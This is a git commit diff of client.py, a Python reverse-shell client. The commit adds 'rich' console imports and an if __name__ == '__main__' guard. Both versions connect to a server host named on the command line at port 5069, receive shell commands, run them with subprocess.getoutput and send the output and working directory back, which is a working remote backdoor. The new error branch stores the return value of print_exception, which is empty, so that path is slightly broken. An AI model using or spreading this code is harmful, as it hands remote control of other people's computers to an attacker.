d29dc308a6a7b39f7f4d5f52cf7f5311d97cb5a3
cielak <ci3l4k@gmail.com>
2021-12-06 23:44:29 +0100

    added rich imports + if name main

--- client.py
+++ client.py
@@ -2,7 +2,12 @@ import socket
 import os
 import subprocess
 import sys
+from rich.console import Console
+from rich.traceback import install
+from rich.progress import track
 
+install()
+console = Console(record=True)
 SERVER_HOST = sys.argv[1]
 SERVER_PORT = 5069
 BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
@@ -13,35 +18,35 @@ SEPARATOR = "<sep>"
 s = socket.socket()
 # connect to the server
 s.connect((SERVER_HOST, SERVER_PORT))
-
 # get the current directory
 cwd = os.getcwd()
 s.send(cwd.encode())
 
-while True:
-    # receive the command from the server
-    command = s.recv(BUFFER_SIZE).decode()
-    splited_command = command.split()
-    if command.lower() == "exit":
-        # if the command is exit, just break out of the loop
-        break
-    if splited_command[0].lower() == "cd":
-        # cd command, change directory
-        try:
-            os.chdir(' '.join(splited_command[1:]))
-        except FileNotFoundError as e:
-            # if there is an error, set as the output
-            output = str(e)
+if __name__ == "__main__":
+    while True:
+        # receive the command from the server
+        command = s.recv(BUFFER_SIZE).decode()
+        split_command = command.split()
+        if command.lower() == "exit":
+            # if the command is exit, just break out of the loop
+            break
+        if split_command[0].lower() == "cd":
+            # cd command, change directory
+            try:
+                os.chdir(' '.join(split_command[1:]))
+            except FileNotFoundError as e:
+                # if there is an error, set as the output
+                output = console.print_exception()
+            else:
+                # if operation is successful, empty message
+                output = ""
         else:
-            # if operation is successful, empty message
-            output = ""
-    else:
-        # execute the command and retrieve the results
-        output = subprocess.getoutput(command)
-    # get the current working directory as output
-    cwd = os.getcwd()
-    # send the results back to the server
-    message = f"{output}{SEPARATOR}{cwd}"
-    s.send(message.encode())
-# close client connection
-s.close()
+            # execute the command and retrieve the results
+            output = subprocess.getoutput(command)
+        # get the current working directory as output
+        cwd = os.getcwd()
+        # send the results back to the server
+        message = f"{output}{SEPARATOR}{cwd}"
+        s.send(message.encode())
+    # close client connection
+    s.close()
